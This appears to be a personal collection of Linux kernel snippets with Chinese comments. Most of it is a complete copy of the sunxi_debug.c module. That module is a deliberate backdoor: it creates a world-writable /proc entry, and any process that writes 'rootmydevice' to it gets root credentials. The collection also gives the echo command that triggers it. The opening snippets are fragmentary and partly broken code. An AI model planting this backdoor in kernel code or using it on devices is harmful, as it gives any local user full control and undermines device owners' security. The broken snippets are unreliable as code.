// 检查版本号
if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 37) {}

// 打印时间
include<linux / time.h>

    struct timeval tv, old;

do_gettimeofday(&tv);
printk("report X=%d, Y=%d, time=%lu-%06lu, delay=%dms\n", x, y, tv.tv_sec, tv.tv_usec, ((tv.tv_sec - old.tv_sec) * 1000000 + (tv.tv_usec - old.tv_usec)) / 1000);

// 当前进程信息
if (current->comm[0] == 's' && current->comm[1] == 'e' && current->comm[2] == 't')
    printk("do_PrefetchAbort on %s(%d), addr=0x%08X\n", current->comm, task_pid_nr(current), addr);

// 给任意UID获得root权限
/*
echo "rootmydevice" > /proc/sunxi_debug/sunxi_debug
*/
/*
 * Sunxi_debug.c
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 */
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/export.h>
#include <linux/kthread.h>

#include <linux/debugfs.h>
#include <linux/proc_fs.h> 
#include <linux/uaccess.h>
#include <linux/cred.h>

                                          static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_su;

static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
                               unsigned long count, void *data)
{
    char *buf;
    struct cred *cred;

    if (count < 1)
        return -EINVAL;

    buf = kmalloc(count, GFP_KERNEL);
    if (!buf)
        return -ENOMEM;

    if (copy_from_user(buf, buffer, count))
    {
        kfree(buf);
        return -EFAULT;
    }

    if (!strncmp("rootmydevice", (char *)buf, 12))
    {
        cred = (struct cred *)__task_cred(current);
        cred->uid = 0;
        cred->gid = 0;
        cred->suid = 0;
        cred->euid = 0;
        cred->euid = 0;
        cred->egid = 0;
        cred->fsuid = 0;
        cred->fsgid = 0;
        printk("now you are root\n");
    }

    kfree(buf);
    return count;
}

static int sunxi_proc_su_read(char *page, char **start, off_t off,
                              int count, int *eof, void *data)
{
    printk("sunxi debug: rootmydevice\n");
    return 0;
}

static int sunxi_root_procfs_attach(void)
{
    proc_root = proc_mkdir("sunxi_debug", NULL);
    proc_su = create_proc_entry("sunxi_debug", 0666, proc_root);
    if (IS_ERR(proc_su))
    {
        printk("create sunxi_debug dir error\n");
        return -1;
    }
    proc_su->data = NULL;
    proc_su->read_proc = sunxi_proc_su_read;
    proc_su->write_proc = sunxi_proc_su_write;
    return 0;
}

static int sunxi_debug_init(void)
{
    int ret;
    ret = sunxi_root_procfs_attach();
    printk("===fe3o4==== sunxi_root_procfs_attach ret:%d\n", ret);
    if (ret)
    {
        printk("===fe3o4== sunxi_root_procfs_attach failed===\n ");
    }
    return ret;
}

subsys_initcall(sunxi_debug_init);
